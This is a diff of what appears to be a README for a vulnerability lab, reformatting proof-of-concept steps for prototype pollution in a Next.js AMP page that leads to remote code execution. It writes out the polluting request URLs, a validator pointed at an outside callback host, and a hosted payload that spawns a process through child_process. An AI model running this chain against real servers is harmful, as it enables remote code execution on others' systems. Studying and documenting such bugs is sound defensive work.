@@ -38,30 +38,24 @@ npm start
 **Poc**
 
 1. Request to any AMP enabled page
+
    ```sh
-   /any-page-that-has-amp-enabled
+   # any page that has AMP enabled
+   /
    ```
+
 2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
+
    ```sh
    /vulnerable?amp=1&__proto__.amp=hybrid
    ```
+
 3. Request to vulnerable page with `validator` should trigger the RCE.
+
    ```sh
    /vulnerable?__proto__.validator=https://xss-callback.pwnfunction.repl.co/
    # Hosted payload: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
    ```
-
-```sh
-# Request 1:
-/
-
-# Request 2
-/vulnerable?amp=1&__proto__.amp=hybrid
-
-# Request 3
-/vulnerable?__proto__.validator=https://xss-callback.pwnfunction.repl.co/
-# Hosted payload: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
-```
 
 **Cause**
 
